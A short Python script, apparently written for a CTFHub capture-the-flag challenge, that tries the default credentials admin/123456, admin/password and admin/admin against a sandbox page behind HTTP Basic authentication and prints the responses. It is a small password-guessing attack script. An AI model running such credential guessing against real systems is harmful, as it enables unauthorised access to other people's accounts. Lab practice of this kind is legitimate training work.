# -*- coding: utf-8 -*-
"""严谨验证：admin/123456 是否通过认证（打印状态码 + 响应头）"""
import requests

url = "http://challenge-52bf5e999da1a0df.sandbox.ctfhub.com:10800/flag.html"

for pwd in ["123456", "password", "admin"]:
    r = requests.get(url, auth=("admin", pwd), timeout=10, allow_redirects=False)
    www_auth = r.headers.get("WWW-Authenticate", "(无)")
    print(f"admin/{pwd:<10} -> HTTP {r.status_code} | WWW-Authenticate: {www_auth} | len={len(r.text)}")
    if r.status_code == 200:
        print(f"  响应前 200 字符: {r.text[:200].replace(chr(10), ' ')}")
        print()
